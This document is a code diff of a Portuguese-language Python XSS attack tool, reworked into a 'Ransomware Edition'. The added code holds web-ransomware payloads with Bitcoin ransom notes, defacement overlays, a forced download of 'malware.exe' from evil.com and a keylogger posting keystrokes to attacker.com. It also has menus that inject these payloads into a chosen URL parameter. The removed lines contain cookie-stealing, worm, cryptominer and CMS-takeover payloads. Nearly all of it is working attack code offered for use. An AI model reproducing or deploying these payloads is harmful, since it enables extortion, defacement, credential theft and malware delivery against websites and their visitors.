@@ -2,10 +2,10 @@
 # -*- coding: utf-8 -*-
 
 """
-XSS Framework Pro - Edição Avançada
+XSS Framework Pro - Edição Ransomware
 Autor: [Seu Nome]
-Versão: 3.0
-Descrição: Framework completo para testes de vulnerabilidade XSS com recursos avançados
+Versão: 4.0
+Descrição: Framework avançado para testes de vulnerabilidade XSS com recursos de ransomware web
 """
 
 import requests
@@ -23,14 +23,14 @@ init()
 # Banner atualizado
 BANNER = f"""
 {Fore.RED}
- ██╗  ██╗███████╗███████╗    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
- ╚██╗██╔╝╚══███╔╝╚══███╔╝   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
-  ╚███╔╝   ███╔╝   ███╔╝    ███████║   ██║      ██║   ███████║██║     █████╔╝ 
-  ██╔██╗  ███╔╝   ███╔╝     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
- ██╔╝ ██╗███████╗███████╗██╗██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
- ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+ ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
+ ╚██╗██╔╝╚══███╔╝╚══███╔╝    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
+  ╚███╔╝   ███╔╝   ███╔╝     ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
+  ██╔██╗  ███╔╝   ███╔╝      ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
+ ██╔╝ ██╗███████╗███████╗    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
+ ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
 {Fore.YELLOW}
-  XSS Framework Pro - Edição Avançada | {Fore.CYAN}Multi-Vetores | Evasão Avançada{Style.RESET_ALL}
+  XSS Framework Pro - Edição Ransomware | {Fore.CYAN}Web Crypto | Ataques Visuais{Style.RESET_ALL}
 """
 
 # Categorias de payloads avançados
@@ -47,72 +47,77 @@ PAYLOAD_CATEGORIES = {
         'name': 'Sequestro de Sessão',
         'payloads': [
             "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
-            "<img src=x onerror=\"fetch('https://attacker.com/log?data='+document.cookie)\">",
-            "<script>new Image().src='http://attacker.com/collect?cookie='+encodeURI(document.cookie);</script>"
+            "<img src=x onerror=\"fetch('https://attacker.com/log?data='+document.cookie)\">"
         ]
     },
     '3': {
-        'name': 'Redirecionamento',
+        'name': 'Ransomware Web',
         'payloads': [
-            "<script>window.location.href='https://phishing-site.com'</script>",
-            "<meta http-equiv=\"refresh\" content=\"0; url=https://evil.com\">",
-            "<iframe src=\"javascript:document.location.replace('https://malicious.site')\">"
+            """<script>
+async function encryptData() {
+  const key = await crypto.subtle.generateKey({name: "AES-GCM", length: 256}, true, ["encrypt"]);
+  const data = new TextEncoder().encode(document.body.innerHTML);
+  const encrypted = await crypto.subtle.encrypt({name: "AES-GCM", iv: window.crypto.getRandomValues(new Uint8Array(12))}, key, data);
+  document.body.innerHTML = '<h1 style="color:red;">SEUS DADOS FORAM CIFRADOS! PAGUE 0.5 BTC PARA RECUPERAR</h1><p>Contato: ransom@evil.com</p>';
+}
+encryptData();
+</script>""",
+            """<script>
+document.body.innerHTML = `
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:red;text-align:center;padding-top:100px">
+  <h1>SEU SITE FOI HACKEADO!</h1>
+  <img src="https://i.imgur.com/LJwvbq9.png" style="width:200px">
+  <p>Para recuperar o acesso, envie 1 Bitcoin para: 1Hacker1EvilAddress</p>
+</div>`;
+</script>"""
         ]
     },
     '4': {
-        'name': 'Keylogging',
+        'name': 'Ataque Visual Personalizado',
         'payloads': [
-            "<script>document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}</script>",
-            "<input onfocus=\"this.style='position:fixed;left:-999px'\" onblur=\"fetch('https://attacker.com/creds?val='+this.value)\">"
+            """<script>
+const imageUrl = 'YOUR_IMAGE_URL';
+const message = 'YOUR_MESSAGE';
+document.body.innerHTML = `
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#fff;text-align:center;padding-top:50px">
+  <img src="${imageUrl}" style="max-width:80%;max-height:60vh">
+  <h1 style="color:red;margin-top:30px">${message}</h1>
+</div>`;
+</script>"""
         ]
     },
     '5': {
-        'name': 'Defacement',
+        'name': 'Download Malicioso',
         'payloads': [
-            "<script>document.body.innerHTML='<h1 style=color:red>HACKED</h1>'</script>",
-            "<style>*{background:#000 !important;color:#f00 !important}</style>"
+            """<script>
+const link = document.createElement('a');
+link.href = 'https://evil.com/malware.exe';
+link.download = 'update.exe';
+document.body.appendChild(link);
+link.click();
+</script>""",
+            """<script>
+setTimeout(() => {
+  window.location.href = 'https://evil.com/fake_update.php';
+}, 3000);
+</script>"""
         ]
     },
     '6': {
-        'name': 'Polyglot Avançado',
+        'name': 'Keylogging Avançado',
         'payloads': [
-            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert('XSS'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
-            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"'/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
-        ]
-    },
-    '7': {
-        'name': 'Evasão Avançada',
-        'payloads': [
-            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
-            "<img src=x oneonerrorrror=alert('XSS')>",
-            "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
-        ]
-    },
-    '8': {
-        'name': 'Worm XSS',
-        'payloads': [
-            "<script>if(!window.XSS_WORM){window.XSS_WORM=1;document.write('<script src=\\'https://evil.com/worm.js\\'><\\/script>')}</script>",
-            "<script>setInterval(function(){document.write('<script src=\\'https://evil.com/worm.js\\'><\\/script>')},5000);</script>"
-        ]
-    },
-    '9': {
-        'name': 'Criptomineração',
-        'payloads': [
-            "<script src='https://coinhive.com/lib/miner.min.js' async></script><script>var miner=new CoinHive.Anonymous('YOUR_KEY');miner.start();</script>",
-            "<iframe src='https://authedmine.com/media/miner.html?key=YOUR_KEY' style='width:0;height:0;border:0;border:none;'></iframe>"
-        ]
-    },
-    '10': {
-        'name': 'Screenlogging',
-        'payloads': [
-            "<script src='https://html2canvas.hertzen.com/dist/html2canvas.min.js'></script><script>html2canvas(document.body).then(canvas=>{fetch('https://attacker.com/steal',{method:'POST',body:canvas.toDataURL()});});</script>"
-        ]
-    },
-    '11': {
-        'name': 'Ataques CMS',
-        'payloads': [
-            "<script>jQuery.get(ajaxurl,{action:'update_option',option:'admin_email',new_value:'hacker@evil.com'})</script>",  # WordPress
-            "<script>fetch('/administrator/index.php?option=com_users&task=user.apply&id=100',{method:'POST',body:'jform[email]=hacker@evil.com'})</script>"  # Joomla
+            """<script>
+const keys = [];
+document.onkeypress = function(e) {
+  keys.push(e.key);
+  if(keys.length % 10 == 0) {
+    fetch('https://attacker.com/log', {
+      method: 'POST',
+      body: JSON.stringify(keys)
+    });
+  }
+}
+</script>"""
         ]
     }
 }
@@ -135,10 +140,10 @@ def show_main_menu():
     print(f"║       {Fore.YELLOW}XSS FRAMEWORK PRO - MENU PRINCIPAL{Fore.CYAN}       ║")
     print(f"╠════════════════════════════════════════════╣")
     print(f"║ {Fore.GREEN}1. {Fore.WHITE}Testar XSS em URL Específica{'':<15}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Scan Automático de Sites{'':<18}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Ataque em Massa (Lista de URLs){'':<10}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Explorar CMS Específico{'':<18}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}5. {Fore.WHITE}Gerador de Payloads Customizados{'':<7}{Fore.CYAN}║")
+    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Ataque Ransomware Web{'':<18}{Fore.CYAN}║")
+    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Ataque Visual Personalizado{'':<10}{Fore.CYAN}║")
+    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Download Forçado{'':<23}{Fore.CYAN}║")
+    print(f"║ {Fore.GREEN}5. {Fore.WHITE}Keylogging Avançado{'':<18}{Fore.CYAN}║")
     print(f"║ {Fore.GREEN}0. {Fore.WHITE}Sair{'':<33}{Fore.CYAN}║")
     print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")
 
@@ -149,19 +154,7 @@ def show_payload_menu():
     print(f"╠════════════════════════════════════════════╣")
     for key in PAYLOAD_CATEGORIES:
         print(f"║ {Fore.GREEN}{key}. {Fore.WHITE}{PAYLOAD_CATEGORIES[key]['name']:<35}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}12.{Fore.WHITE} Custom Payload{'':<25}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Voltar{'':<32}{Fore.CYAN}║")
-    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")
-
-def show_cms_menu():
-    """Mostra o menu de CMS específicos"""
-    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
-    print(f"║       {Fore.YELLOW}SELECIONE O CMS PARA EXPLORAÇÃO{Fore.CYAN}       ║")
-    print(f"╠════════════════════════════════════════════╣")
-    print(f"║ {Fore.GREEN}1. {Fore.WHITE}WordPress{'':<32}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Joomla{'':<34}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Drupal{'':<34}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Magento{'':<33}{Fore.CYAN}║")
+    print(f"║ {Fore.GREEN}7.{Fore.WHITE} Custom Payload{'':<25}{Fore.CYAN}║")
     print(f"║ {Fore.GREEN}0. {Fore.WHITE}Voltar{'':<32}{Fore.CYAN}║")
     print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")
 
@@ -193,134 +186,71 @@ def test_xss(url, param, payload, method='GET', data=None):
         print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
         return False, None
 
-def scan_site_for_parameters(url):
-    """Tenta identificar parâmetros na URL"""
-    print(f"\n{Fore.YELLOW}[*] Analisando {url} para encontrar parâmetros...{Style.RESET_ALL}")
+def create_custom_visual_attack():
+    """Cria um ataque visual personalizado"""
+    print(f"\n{Fore.YELLOW}[*] Criando Ataque Visual Personalizado{Style.RESET_ALL}")
     
-    try:
-        response = requests.get(url, headers={'User-Agent': get_random_user_agent()}, timeout=10)
-        
-        # Simples análise de parâmetros - em um scanner real seria mais sofisticado
-        parsed = urllib.parse.urlparse(url)
-        params = urllib.parse.parse_qs(parsed.query)
-        
-        if params:
-            print(f"{Fore.GREEN}[+] Parâmetros encontrados: {', '.join(params.keys())}{Style.RESET_ALL}")
-            return list(params.keys())
-        else:
-            print(f"{Fore.YELLOW}[-] Nenhum parâmetro encontrado na URL{Style.RESET_ALL}")
-            return None
-            
-    except Exception as e:
-        print(f"{Fore.RED}[!] Erro ao escanear: {e}{Style.RESET_ALL}")
-        return None
+    image_url = input(f"{Fore.CYAN}[?] URL da imagem (deixe vazio para pular): {Style.RESET_ALL}")
+    message = input(f"{Fore.CYAN}[?] Mensagem a ser exibida: {Style.RESET_ALL}")
+    bg_color = input(f"{Fore.CYAN}[?] Cor de fundo (ex: #000000): {Style.RESET_ALL}") or "#000"
+    text_color = input(f"{Fore.CYAN}[?] Cor do texto (ex: #ff0000): {Style.RESET_ALL}") or "#f00"
+    
+    payload = f"""<script>
+document.body.innerHTML = `
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:{bg_color};z-index:9999;color:{text_color};text-align:center;padding-top:50px">
+  {f'<img src="{image_url}" style="max-width:80%;max-height:60vh;margin-bottom:20px">' if image_url else ''}
+  <h1 style="font-size:2.5em;margin-bottom:20px">{message}</h1>
+  <p style="font-size:1.5em">Seu site foi comprometido</p>
+</div>`;
+</script>"""
+    
+    return payload
 
-def mass_attack(url_list_file, param):
-    """Executa ataque em massa a partir de uma lista de URLs"""
-    try:
-        with open(url_list_file, 'r') as f:
-            urls = [line.strip() for line in f if line.strip()]
-            
-        print(f"\n{Fore.YELLOW}[*] Iniciando ataque em massa a {len(urls)} URLs{Style.RESET_ALL}")
-        
-        for url in urls:
-            print(f"\n{Fore.CYAN}[*] Testando: {url}{Style.RESET_ALL}")
-            category = PAYLOAD_CATEGORIES['1']  # Usa payloads básicos por padrão
-            
-            for payload in category['payloads']:
-                vulnerable, target_url = test_xss(url, param, payload)
-                if vulnerable:
-                    print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload: {payload}{Style.RESET_ALL}")
-                    print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
-                    break
-                sleep(0.5)
-                
-    except Exception as e:
-        print(f"{Fore.RED}[!] Erro no ataque em massa: {e}{Style.RESET_ALL}")
-
-def generate_custom_payload():
-    """Gera payloads customizados com encoding"""
-    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
-    print(f"║       {Fore.YELLOW}GERADOR DE PAYLOADS CUSTOMIZADOS{Fore.CYAN}       ║")
-    print(f"╠════════════════════════════════════════════╣")
-    print(f"║ {Fore.GREEN}1. {Fore.WHITE}Codificar em Unicode{'':<24}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Codificar em Hex{'':<27}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Codificar em Base64{'':<23}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Fragmentar Payload{'':<24}{Fore.CYAN}║")
-    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Voltar{'':<32}{Fore.CYAN}║")
-    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")
+def create_ransomware_payload():
+    """Cria um payload de ransomware personalizado"""
+    print(f"\n{Fore.YELLOW}[*] Criando Payload de Ransomware{Style.RESET_ALL}")
     
-    choice = input(f"\n{Fore.YELLOW}[?] Selecione uma opção: {Style.RESET_ALL}")
+    bitcoin_address = input(f"{Fore.CYAN}[?] Endereço Bitcoin: {Style.RESET_ALL}") or "1Hacker1EvilAddress"
+    email = input(f"{Fore.CYAN}[?] Email de contato: {Style.RESET_ALL}") or "ransom@evil.com"
+    amount = input(f"{Fore.CYAN}[?] Valor do resgate: {Style.RESET_ALL}") or "0.5"
     
-    if choice == '0':
-        return None
+    payload = f"""<script>
+async function encryptData() {{
+  try {{
+    const key = await crypto.subtle.generateKey({{name: "AES-GCM", length: 256}}, true, ["encrypt"]);
+    const data = new TextEncoder().encode(document.body.innerHTML);
+    const encrypted = await crypto.subtle.encrypt({{name: "AES-GCM", iv: window.crypto.getRandomValues(new Uint8Array(12))}}, key, data);
     
-    payload = input(f"{Fore.CYAN}[?] Digite o payload base: {Style.RESET_ALL}")
+    document.body.innerHTML = `
+    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#f00;text-align:center;padding-top:100px">
+      <h1 style="font-size:3em">SEUS DADOS FORAM CIFRADOS!</h1>
+      <p style="font-size:1.5em">Para recuperar o acesso, envie {amount} Bitcoin para:</p>
+      <p style="font-size:1.8em;word-break:break-all">{bitcoin_address}</p>
+      <p style="font-size:1.2em">Contato: {email}</p>
+      <p style="font-size:0.8em;margin-top:50px">Todos os seus dados foram criptografados com AES-256</p>
+    </div>`;
+  }} catch(e) {{
+    document.body.innerHTML = `
+    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#f00;text-align:center;padding-top:100px">
+      <h1>SEU SITE FOI HACKEADO!</h1>
+      <p>Para recuperar o acesso, envie {amount} Bitcoin para: {bitcoin_address}</p>
+    </div>`;
+  }}
+}}
+encryptData();
+</script>"""
     
-    if choice == '1':
-        # Codificação Unicode
-        encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
-        return f"<script>eval('{encoded}')</script>"
-    
-    elif choice == '2':
-        # Codificação Hex
-        encoded = ''.join([f'\\x{ord(c):02x}' for c in payload])
-        return f"<script>eval('{encoded}')</script>"
-    
-    elif choice == '3':
-        # Codificação Base64
-        encoded = base64.b64encode(payload.encode()).decode()
-        return f"<script>eval(atob('{encoded}'))</script>"
-    
-    elif choice == '4':
-        # Fragmentação de payload
-        parts = [payload[i:i+10] for i in range(0, len(payload), 10)]
-        reconstructed = '+'.join([f"'{part}'" for part in parts])
-        return f"<script>eval({reconstructed})</script>"
-    
-    else:
-        print(f"{Fore.RED}[!] Opção inválida{Style.RESET_ALL}")
-        return None
-
-def exploit_cms(cms_type, url):
-    """Explora vulnerabilidades específicas de CMS"""
-    print(f"\n{Fore.YELLOW}[*] Explorando {cms_type} em {url}{Style.RESET_ALL}")
-    
-    if cms_type.lower() == 'wordpress':
-        payloads = [
-            "<script>jQuery.get(ajaxurl, {action: 'update_option', option: 'admin_email', new_value: 'hacker@evil.com'})</script>",
-            "<img src=x onerror=\"fetch('/wp-admin/admin-ajax.php?action=parse-media-shortcode&shortcode=[video src=1 onerror=alert(1)]')\">"
-        ]
-    elif cms_type.lower() == 'joomla':
-        payloads = [
-            "<script>fetch('/administrator/index.php?option=com_users&task=user.apply&id=100',{method:'POST',body:'jform[email]=hacker@evil.com'})</script>",
-            "<img src=x onerror=\"fetch('/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,user()),1)')\">"
-        ]
-    elif cms_type.lower() == 'drupal':
-        payloads = [
-            "<script>fetch('/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', {method: 'POST', body: 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo hacked'})</script>"
-        ]
-    else:
-        print(f"{Fore.RED}[!] CMS não suportado{Style.RESET_ALL}")
-        return
-    
-    # Tenta encontrar parâmetros comuns
-    params = ['q', 'search', 's', 'id', 'page'] if cms_type.lower() == 'wordpress' else ['option', 'view', 'id']
-    
-    for param in params:
-        print(f"\n{Fore.CYAN}[*] Testando parâmetro: {param}{Style.RESET_ALL}")
-        
-        for payload in payloads:
-            vulnerable, target_url = test_xss(url, param, payload)
-            if vulnerable:
-                print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload: {payload}{Style.RESET_ALL}")
-                print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
-                return
-    
-    print(f"{Fore.RED}[-] Nenhuma vulnerabilidade encontrada{Style.RESET_ALL}")
+    return payload
 
 def main():
     print_banner()
+    
+    if len(sys.argv) < 3:
+        url = input(f"{Fore.CYAN}[?] Digite a URL alvo (ex: http://site.com/vulneravel.php): {Style.RESET_ALL}")
+        param = input(f"{Fore.CYAN}[?] Digite o parâmetro a testar (ex: busca): {Style.RESET_ALL}")
+    else:
+        url = sys.argv[1]
+        param = sys.argv[2]
     
     while True:
         show_main_menu()
@@ -331,90 +261,82 @@ def main():
             break
             
         elif choice == '1':
-            if len(sys.argv) < 3:
-                url = input(f"{Fore.CYAN}[?] Digite a URL alvo (ex: http://site.com/vulneravel.php): {Style.RESET_ALL}")
-                param = input(f"{Fore.CYAN}[?] Digite o parâmetro a testar (ex: busca): {Style.RESET_ALL}")
-            else:
-                url = sys.argv[1]
-                param = sys.argv[2]
+            show_payload_menu()
+            payload_choice = input(f"\n{Fore.YELLOW}[?] Selecione uma categoria de payload (0-7): {Style.RESET_ALL}")
             
-            while True:
-                show_payload_menu()
-                payload_choice = input(f"\n{Fore.YELLOW}[?] Selecione uma categoria de payload (0-12): {Style.RESET_ALL}")
-                
-                if payload_choice == '0':
-                    break
-                    
-                elif payload_choice == '12':
-                    custom_payload = input(f"{Fore.CYAN}[?] Digite seu payload customizado: {Style.RESET_ALL}")
-                    vulnerable, target_url = test_xss(url, param, custom_payload)
-                    if vulnerable:
-                        print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload injetado com sucesso em: {target_url}{Style.RESET_ALL}")
-                    else:
-                        print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
-                
-                elif payload_choice in PAYLOAD_CATEGORIES:
-                    category = PAYLOAD_CATEGORIES[payload_choice]
-                    print(f"\n{Fore.CYAN}=== TESTANDO CATEGORIA: {category['name']} ==={Style.RESET_ALL}")
-                    
-                    for i, payload in enumerate(category['payloads'], 1):
-                        print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
-                        vulnerable, target_url = test_xss(url, param, payload)
-                        
-                        if vulnerable:
-                            print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
-                            print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
-                        sleep(0.2)
-                        
-                    print(f"\n{Fore.YELLOW}[*] Teste da categoria {category['name']} concluído!{Style.RESET_ALL}")
-                
-                else:
-                    print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")
-            
-        elif choice == '2':
-            url = input(f"{Fore.CYAN}[?] Digite a URL para scan (ex: http://site.com): {Style.RESET_ALL}")
-            params = scan_site_for_parameters(url)
-            
-            if params:
-                param = params[0]  # Usa o primeiro parâmetro encontrado
-                category = PAYLOAD_CATEGORIES['1']  # Usa payloads básicos para scan
-                
-                for payload in category['payloads']:
-                    vulnerable, target_url = test_xss(url, param, payload)
-                    if vulnerable:
-                        print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload: {payload}{Style.RESET_ALL}")
-                        print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
-                        break
-                    sleep(0.5)
-            
-        elif choice == '3':
-            url_list = input(f"{Fore.CYAN}[?] Digite o caminho do arquivo com a lista de URLs: {Style.RESET_ALL}")
-            param = input(f"{Fore.CYAN}[?] Digite o parâmetro a testar (ex: busca): {Style.RESET_ALL}")
-            mass_attack(url_list, param)
-            
-        elif choice == '4':
-            show_cms_menu()
-            cms_choice = input(f"\n{Fore.YELLOW}[?] Selecione o CMS (0-4): {Style.RESET_ALL}")
-            
-            if cms_choice == '1':
-                cms_type = 'WordPress'
-            elif cms_choice == '2':
-                cms_type = 'Joomla'
-            elif cms_choice == '3':
-                cms_type = 'Drupal'
-            elif cms_choice == '4':
-                cms_type = 'Magento'
-            else:
+            if payload_choice == '0':
                 continue
                 
-            url = input(f"{Fore.CYAN}[?] Digite a URL do {cms_type} (ex: http://site.com): {Style.RESET_ALL}")
-            exploit_cms(cms_type, url)
+            elif payload_choice == '7':
+                custom_payload = input(f"{Fore.CYAN}[?] Digite seu payload customizado: {Style.RESET_ALL}")
+                vulnerable, target_url = test_xss(url, param, custom_payload)
+                if vulnerable:
+                    print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload injetado com sucesso em: {target_url}{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
             
+            elif payload_choice in PAYLOAD_CATEGORIES:
+                category = PAYLOAD_CATEGORIES[payload_choice]
+                print(f"\n{Fore.CYAN}=== TESTANDO CATEGORIA: {category['name']} ==={Style.RESET_ALL}")
+                
+                for i, payload in enumerate(category['payloads'], 1):
+                    print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
+                    vulnerable, target_url = test_xss(url, param, payload)
+                    
+                    if vulnerable:
+                        print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
+                        print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
+                    sleep(0.2)
+                    
+                print(f"\n{Fore.YELLOW}[*] Teste da categoria {category['name']} concluído!{Style.RESET_ALL}")
+            
+            else:
+                print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")
+        
+        elif choice == '2':
+            payload = create_ransomware_payload()
+            vulnerable, target_url = test_xss(url, param, payload)
+            if vulnerable:
+                print(f"{Fore.GREEN}[+] Payload de ransomware injetado com sucesso!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
+        
+        elif choice == '3':
+            payload = create_custom_visual_attack()
+            vulnerable, target_url = test_xss(url, param, payload)
+            if vulnerable:
+                print(f"{Fore.GREEN}[+] Ataque visual injetado com sucesso!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
+        
+        elif choice == '4':
+            category = PAYLOAD_CATEGORIES['5']
+            print(f"\n{Fore.CYAN}=== TESTANDO DOWNLOADS MALICIOSOS ==={Style.RESET_ALL}")
+            
+            for i, payload in enumerate(category['payloads'], 1):
+                print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
+                vulnerable, target_url = test_xss(url, param, payload)
+                
+                if vulnerable:
+                    print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
+                    print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
+                sleep(0.2)
+        
         elif choice == '5':
-            custom_payload = generate_custom_payload()
-            if custom_payload:
-                print(f"\n{Fore.GREEN}[+] Payload gerado: {custom_payload}{Style.RESET_ALL}")
+            category = PAYLOAD_CATEGORIES['6']
+            print(f"\n{Fore.CYAN}=== TESTANDO KEYLOGGING AVANÇADO ==={Style.RESET_ALL}")
             
+            for i, payload in enumerate(category['payloads'], 1):
+                print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
+                vulnerable, target_url = test_xss(url, param, payload)
+                
+                if vulnerable:
+                    print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
+                    print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
+                sleep(0.2)
+        
         else:
             print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")
 
